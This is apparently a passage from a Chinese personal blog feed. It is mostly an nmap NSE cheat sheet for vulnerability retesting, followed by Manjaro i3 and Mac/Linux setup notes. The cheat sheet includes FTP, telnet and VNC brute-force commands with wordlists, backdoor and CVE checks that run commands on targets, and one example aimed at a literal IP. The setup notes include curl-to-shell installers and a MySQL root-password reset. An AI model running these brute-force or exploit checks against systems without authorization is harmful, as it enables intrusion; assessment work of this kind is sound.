class="line">nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 ipaddress</span><br></pre></td></tr></table></figure></p><p>检测CVE-2011-2523中的ftp-vsftpd-backdoor<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T2 --script ftp-vsftpd-backdoor ipaddress</span><br></pre></td></tr></table></figure></p><p>验证http中开启的-methods 方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T3 --script http-methods --script-args http.test-all=true,http.url-path=/siteaddress</span><br></pre></td></tr></table></figure></p><p>验证HTTP.sys 远程代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script http-vuln-cve2015-1635 ipaddress</span><br></pre></td></tr></table></figure></p><p>验证 SSL POODLE information leak<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 443 --version-light --script ssl-poodle ipaddress</span><br></pre></td></tr></table></figure></p><p>验证http 中开启了put 方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script http-put --script-args http-put.url=/uploads/testput.txt,http-put.file=/root/put.txt ipaddress</span><br></pre></td></tr></table></figure></p><p>验证mysql 匿名访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script mysql-empty-password ipaddress</span><br></pre></td></tr></table></figure></p><p>验证cve2015-1427 漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script http-vuln-cve2015-1427 --script-args command=ls ipaddress</span><br></pre></td></tr></table></figure></p><p>验证cve2014-8877漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd=dir,http-vuln-cve2014-8877.uri=/wordpress ipaddress</span><br></pre></td></tr></table></figure></p><p>验证Cisco ASA中的CVE-2014-2126,CVE-2014-2127,CVE-2014-21,CVE-2014-2129漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 443 --script http-vuln-cve2014-2126,http-vuln-cve2014-2127,http-vuln-cve2014-2128,http-vuln-cve2014-2129 ipaddress</span><br></pre></td></tr></table></figure></p><p>验证低安全的 SSHv1，sslv2协议<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script sshv1,sslv2 siteadress</span><br></pre></td></tr></table></figure></p><p>验证CVE-2014-0224 ssl-ccs-injection<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --script ssl-ccs-injection ipaddress</span><br></pre></td></tr></table></figure></p><p>验证ssl-cert证书问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -v --script ssl-cert ipaddress</span><br></pre></td></tr></table></figure></p><p>验证SSL证书的有限期<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --script ssl-date siteadress</span><br></pre></td></tr></table></figure></p><p>验证 Debian OpenSSL keys<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 443 --script ssl-known-key ipaddress</span><br></pre></td></tr></table></figure></p><p>验证弱加密SSL套件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script ssl-enum-ciphers ipaddress</span><br></pre></td></tr></table></figure></p><p>验证CVE 2015-4000<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script ssl-dh-params siteadress</span><br></pre></td></tr></table></figure></p><p>验证多种SSL漏洞问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 203.195.139.153 --vv --script sshv1,ssl-ccs-injection,ssl-cert,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-google-cert-catalog,ssl-heartbleed,ssl-known-key,sslv2</span><br></pre></td></tr></table></figure></p><p>在网络中检测某主机是否存在窃听他人流量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script sniffer-detect ipaddress</span><br></pre></td></tr></table></figure></p><p>暴力破解telnet<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst --script-args telnet-brute.timeout=8s ipaddress</span><br></pre></td></tr></table></figure></p><p>验证telnet是否支持加密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script telnet-encryption ipaddress</span><br></pre></td></tr></table></figure></p><p>精准地确认端口上运行的服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script unusual-port ipaddress</span><br></pre></td></tr></table></figure></p><p>收集VNC信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script vnc-info ipaddress</span><br></pre></td></tr></table></figure></p><p>暴力破解VNC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script vnc-brute --script-args brute.guesses=6,brute.emptypass=true,userdb=/root/dictionary/user.txt,brute.useraspass=true,passdb=/root/dictionary/pass.txt,brute.retries=3,brute.threads=2,brute.delay=3 ipaddress</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      前两天在做等保中的漏洞复测，用的nmap脚本比较多，今天刚好闲下来，把nmap脚本用法简单写一下
    
    </summary>
    
    
      <category term="nmap" scheme="http://yoursite.com/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>Manjaro i3配置命令及相关优化</title>
    <link href="http://yoursite.com/2020/03/29/Manjaro-i3%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BC%98%E5%8C%96/"/>
    <id>http://yoursite.com/2020/03/29/Manjaro-i3配置命令及相关优化/</id>
    <published>2020-03-29T14:39:16.000Z</published>
    <updated>2020-03-29T14:40:09.068Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Manjaro-i3配置命令及相关优化"><a href="#Manjaro-i3配置命令及相关优化" class="headerlink" title="Manjaro i3配置命令及相关优化"></a>Manjaro i3配置命令及相关优化</h1><h2 id="进入不了安装盘，安装完登录输入完密码黑屏，输入neofetch突然卡住，进入manjaro-manager-settings卡住"><a href="#进入不了安装盘，安装完登录输入完密码黑屏，输入neofetch突然卡住，进入manjaro-manager-settings卡住" class="headerlink" title="进入不了安装盘，安装完登录输入完密码黑屏，输入neofetch突然卡住，进入manjaro manager settings卡住"></a>进入不了安装盘，安装完登录输入完密码黑屏，输入neofetch突然卡住，进入manjaro manager settings卡住</h2><p>对于进入不了安装盘，先进系统，引导界面，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">按e，把driver=free改成driver=intel，</span><br></pre></td></tr></table></figure></p><p>在driver=intel追加一下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdriver=mesa acpi_osi=! acpi_osi=&quot;Windows 2009&quot;</span><br></pre></td></tr></table></figure></p><p>对于安装完登录输入完密码黑屏，输入neofetch突然卡住，进入manjaro manager settings卡住，使用vim或者vi或者nano对/etc/default/grub找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;splash quiet &quot;</span><br></pre></td></tr></table></figure></p><p>在后边追加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdriver=mesa acpi_osi=! acpi_osi=&quot;Windows 2009&quot;</span><br></pre></td></tr></table></figure></p><p>保存退出，为什么追加这个？告诉硬件，我是windows你别在闹屁了<br>在你这样安装完，你的无线和蓝牙可能用不了，这时候你需要插网线或者勇手机开热点，配置更新源更新再去Manjaro Setting manager安装无线网卡</p><h2 id="配置pacman源"><a href="#配置pacman源" class="headerlink" title="配置pacman源"></a>配置pacman源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank</span><br></pre></td></tr></table></figure><p>不知道什么规则，我直接全选了</p><h2 id="配置archlinuxcn"><a href="#配置archlinuxcn" class="headerlink" title="配置archlinuxcn"></a>配置archlinuxcn</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/pacman.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line"></span><br><span class="line">SigLevel = Optional TrustedOnly</span><br><span class="line"></span><br><span class="line">Server = http://repo.archlinuxcn.org/$arch</span><br></pre></td></tr></table></figure><p>选择最快的源列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-mirrors -g</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Syyu</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S archlinuxcn-keyring</span><br></pre></td></tr></table></figure><h2 id="安装yaourt"><a href="#安装yaourt" class="headerlink" title="安装yaourt"></a>安装yaourt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S yaourt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## 安装搜狗输入法</span><br></pre></td></tr></table></figure><p>sudo pacman -S fcitx-sogoupinyin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">sudo pacman -S fcitx-im</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx-configtool</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano ~/.profile</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GTK_IM_MODULE=fcitx</span><br><span class="line">export QT_IM_MODULE=fcitx</span><br><span class="line">export XMODIFIERS=&quot;@im=fcitx&quot;</span><br></pre></td></tr></table></figure><h2 id="安装V2ray"><a href="#安装V2ray" class="headerlink" title="安装V2ray"></a>安装V2ray</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S v2ray</span><br></pre></td></tr></table></figure><p>如果你在安装archlinuxcn遇到问题，以下命令可帮你解决问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /etc/pacman.d/gnupg</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-key --init</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-key --populate archlinux</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-key --refresh-keys</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Sc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Syu</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S archlinuxcn-keyring</span><br></pre></td></tr></table></figure><h2 id="字体安装"><a href="#字体安装" class="headerlink" title="字体安装"></a>字体安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pacman -S ttf-dejavu adobe-source-han-sans-otc-fonts adobe-source-code-pro-fonts wqy-bitmapfont wqy-microhei wqy-zenhei wqy-microhei-lite</span><br></pre></td></tr></table></figure><h2 id="安装chrome"><a href="#安装chrome" class="headerlink" title="安装chrome"></a>安装chrome</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S google-chrome</span><br></pre></td></tr></table></figure><h2 id="安装Firefox"><a href="#安装Firefox" class="headerlink" title="安装Firefox"></a>安装Firefox</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S firefox firefox-i18n-zh-cn</span><br></pre></td></tr></table></figure><h2 id="安装pycharm-社区版"><a href="#安装pycharm-社区版" class="headerlink" title="安装pycharm 社区版"></a>安装pycharm 社区版</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S pycharm</span><br></pre></td></tr></table></figure><p>安装zsh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S zsh</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/zsh #默认启动zsh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## 安装完你发现conky貌似有口口口这样的缺少字体</span><br></pre></td></tr></table></figure><p>/usr/share/conky/conky_maia    #桌面右侧的状态栏<br>/usr/share/conky/conky1.10_shortcuts_maia    #桌面左侧的快捷键显示栏<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改conky_maia支持中文</span><br></pre></td></tr></table></figure></p><p>font = ‘WenQuanYi Micro Hei:size=8’,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">或者</span><br></pre></td></tr></table></figure></p><p>font = ‘WenQuanYi Zen Hei:size=8’,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## 安装powerline</span><br></pre></td></tr></table></figure></p><p>pacman -S ttf-dejavu-sans-mono-powerline python-powerline  powerline  powerline-common<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">pacman -S python-pip git</span><br></pre></td></tr></table></figure></p><p>pip show powerline-status<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑~/.bashrc文件，在文件末尾加上</span><br></pre></td></tr></table></figure></p><p>powerline-daemon -q<br>POWERLINE_BASH_CONTINUATION=1<br>POWERLINE_BASH_SELECT=1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">. /usr/lib/python3.6/site-packages/powerline/bindings/bash/powerline.sh #注意. 和 /usr之间有个空格。</span><br></pre></td></tr></table></figure></p><p>编辑~/.vimrc文件，将一下内容添加到文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rtp+=/usr/lib/python3.6/site-packages/powerline/bindings/vim/</span><br><span class="line">set laststatus=2</span><br><span class="line">set t_Co=256</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      之前都是黑苹果单系统，后来一次的awd上发现虽然苹果是unix但是linux很多库mac没有，本想黑苹果+ParrotSecrityOS，但无奈鸟总是卡在grub上，只能换成黑苹果+Manjaro双系统，这里把折腾Manjaro i3的心得写一下
    
    </summary>
    
    
      <category term="Archlinux" scheme="http://yoursite.com/tags/Archlinux/"/>
    
      <category term="Manjaro" scheme="http://yoursite.com/tags/Manjaro/"/>
    
  </entry>
  
  <entry>
    <title>Mac_Linux系统配置记录</title>
    <link href="http://yoursite.com/2020/03/29/Mac-Linux%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/03/29/Mac-Linux系统配置记录/</id>
    <published>2020-03-29T14:33:05.000Z</published>
    <updated>2020-03-29T14:34:22.124Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MacOS常用配置"><a href="#MacOS常用配置" class="headerlink" title="MacOS常用配置"></a>MacOS常用配置</h1><p>##取消系统更新小红点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.systempreferences AttentionPrefBundleIDs 0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall Dock</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate.plist LastUpdatesAvailable 0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate.plist LastRecommendedUpdatesAvailable 0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo defaults delete /Library/Preferences/com.apple.SoftwareUpdate.plist RecommendedUpdates</span><br></pre></td></tr></table></figure><h2 id="删除mac登陆其他选项"><a href="#删除mac登陆其他选项" class="headerlink" title="删除mac登陆其他选项"></a>删除mac登陆其他选项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo defaults write /Library/Preferences/com.apple.loginwindow SHOWOTHERUSERS_MANAGED -bool FALSE</span><br></pre></td></tr></table></figure><h2 id="v2ray-core安装"><a href="#v2ray-core安装" class="headerlink" title="v2ray core安装"></a>v2ray core安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash &lt;(curl -L -s https://install.direct/go.sh)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp config.json /usr/local/etc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo v2ray -config=/usr/local/etc/config.json</span><br></pre></td></tr></table></figure><h2 id="v2rayx客户端安装"><a href="#v2rayx客户端安装" class="headerlink" title="v2rayx客户端安装"></a>v2rayx客户端安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cask install v2rayx</span><br></pre></td></tr></table></figure><h2 id="终端代理"><a href="#终端代理" class="headerlink" title="终端代理"></a>终端代理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=http://127.0.0.1:7890</span><br><span class="line">export https_proxy=http://127.0.0.1:7890</span><br><span class="line">export all_proxy=socks5://127.0.0.1:7891</span><br></pre></td></tr></table></figure><h2 id="发现10-14-4之后metasploit安装之后-不能直接加入到变量"><a href="#发现10-14-4之后metasploit安装之后-不能直接加入到变量" class="headerlink" title="发现10.14.4之后metasploit安装之后 不能直接加入到变量"></a>发现10.14.4之后metasploit安装之后 不能直接加入到变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /opt/metasploit-framework/bin/msfconsole /usr/local/bin</span><br></pre></td></tr></table></figure><h2 id="brew安装"><a href="#brew安装" class="headerlink" title="brew安装"></a>brew安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure><h2 id="brew-如何安装程序？如何卸载程序？如何更新？"><a href="#brew-如何安装程序？如何卸载程序？如何更新？" class="headerlink" title="brew 如何安装程序？如何卸载程序？如何更新？"></a>brew 如何安装程序？如何卸载程序？如何更新？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">brew install nmap //安装nmap，其他举一反三即可</span><br><span class="line">brew search nmap //搜索nmap报</span><br><span class="line">brew info nmap //查看nmap包信息</span><br><span class="line">brew uninstall nmap //卸载nmap包</span><br><span class="line">brew list //查看已安装的包</span><br><span class="line">brew update //更新homebrew</span><br><span class="line">brew upgrade nmap</span><br><span class="line">brew cleanup nmap</span><br></pre></td></tr></table></figure><h2 id="zsh安装"><a href="#zsh安装" class="headerlink" title="zsh安装"></a>zsh安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/xzhih/one-key-hidpi/master/hidpi-zh.sh)&quot;</span><br><span class="line">busybox</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /bin/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 755 busybox</span><br></pre></td></tr></table></figure><h2 id="Mac下安装redis"><a href="#Mac下安装redis" class="headerlink" title="Mac下安装redis"></a>Mac下安装redis</h2><p>先安装brew，没有brew的话，可以执行以下命令进行安装redis<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL ￼https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure></p><h2 id="brew安装redis"><a href="#brew安装redis" class="headerlink" title="brew安装redis"></a>brew安装redis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install redis</span><br></pre></td></tr></table></figure><h2 id="启动redis"><a href="#启动redis" class="headerlink" title="启动redis"></a>启动redis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server</span><br></pre></td></tr></table></figure><p>配置redis<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br></pre></td></tr></table></figure></p><p>关闭redis<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli shutdown</span><br></pre></td></tr></table></figure></p><p>查看redis运行情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i tcp:6379</span><br></pre></td></tr></table></figure></p><p>ps aux |grep redis<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># Linux配置</span><br></pre></td></tr></table></figure></p><p>#ustc<br>deb <a href="http://mirrors.ustc.edu.cn/parrot/" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/parrot/</a> parrot main contrib non-free<br>deb-src <a href="http://mirrors.ustc.edu.cn/parrot/" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/parrot/</a> parrot main contrib non-free</p><p>#tsinghua<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/parrot/" target="_blank" rel="noopener">http://mirrors.tuna.tsinghua.edu.cn/parrot/</a> parrot main contrib non-free<br>deb-src <a href="http://mirrors.tuna.tsinghua.edu.cn/parrot/" target="_blank" rel="noopener">http://mirrors.tuna.tsinghua.edu.cn/parrot/</a> parrot main contrib non-free<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## ssh配置</span><br></pre></td></tr></table></figure></p><p>sudo vi /etc/ssh/sshd_config<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">PermitRootLogin no</span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile  .ssh/authorized_keys .ssh/authorized_keys2</span><br><span class="line"></span><br><span class="line">PasswordAuthentication no    # 取消密码认证</span><br><span class="line">sudo service mysql stop</span><br></pre></td></tr></table></figure></p><h2 id="mysql相关配置"><a href="#mysql相关配置" class="headerlink" title="mysql相关配置"></a>mysql相关配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld_safe --skip-grant-tables &amp;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -u root mysql</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATE user SET password=PASSWORD(&apos;新密码&apos;) WHERE user=&apos;root&apos;;`</span><br><span class="line"></span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line">\q</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### MySQL_5.7.19</span><br></pre></td></tr></table></figure><p>set password for 用户名@localhost = password(‘新密码’);</p><p>flush privileges;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## jdk配置</span><br></pre></td></tr></table></figure></p><p>sudo vim /etc/profile<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">export JAVA_HOME=/usr/java/jdk1.8.0_231</span><br><span class="line">export JRE_HOME=/usr/java/jdk1.8.0_231/jre</span><br><span class="line">export CLASSPATH=.:$CLASSPATH:$JAVA_HOME/lib:$JRE_HOME/lib</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td 